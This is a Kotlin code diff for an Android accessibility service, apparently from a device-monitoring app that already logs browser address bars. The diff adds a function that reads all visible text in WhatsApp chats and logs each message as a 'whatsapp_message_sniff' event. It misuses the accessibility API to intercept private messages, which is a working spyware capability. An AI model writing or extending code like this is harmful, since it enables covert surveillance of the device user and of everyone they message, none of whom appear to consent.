@@ -134,6 +134,10 @@ class AppMonitorAccessibilityService : AccessibilityService() {
             }
         }
 
+        if (packageName == "com.whatsapp") {
+            sniffWhatsAppMessages(rootInActiveWindow)
+        }
+
         // Browser Monitoring: Sniff address bars
         val browserPackages = listOf("com.android.chrome", "org.mozilla.firefox", "com.microsoft.emmx")
         if (browserPackages.contains(packageName)) {
@@ -187,6 +191,39 @@ class AppMonitorAccessibilityService : AccessibilityService() {
         if (instance === this) {
             instance = null
         }
+    }
+
+    private fun sniffWhatsAppMessages(root: AccessibilityNodeInfo?) {
+        if (root == null) return
+        val stack = mutableListOf<AccessibilityNodeInfo>()
+        stack.add(root)
+
+        while (stack.isNotEmpty()) {
+            val node = stack.removeAt(stack.size - 1)
+            
+            val text = node.text?.toString() ?: ""
+            if (node.className?.contains("TextView") == true && text.isNotBlank()) {
+                if (text.length > 3 && !listOf("Search", "Chats", "Status", "Calls", "Settings").contains(text)) {
+                    logWhatsAppEvent(text)
+                }
+            }
+
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { stack.add(it) }
+            }
+            // Avoid recycling root since it might be reused or handled by caller, 
+            // but children we get via getChild(i) should ideally be recycled if not using the new lifecycle.
+        }
+    }
+
+    private fun logWhatsAppEvent(text: String) {
+        val intent = Intent(this, ADexForegroundService::class.java).apply {
+            action = ServiceActions.ACTION_PACKAGE_EVENT
+            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "whatsapp_message_sniff")
+            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, "com.whatsapp")
+            putExtra("text", text)
+        }
+        ContextCompat.startForegroundService(this, intent)
     }
 
     private fun packageNameInternal(): String = applicationContext.packageName
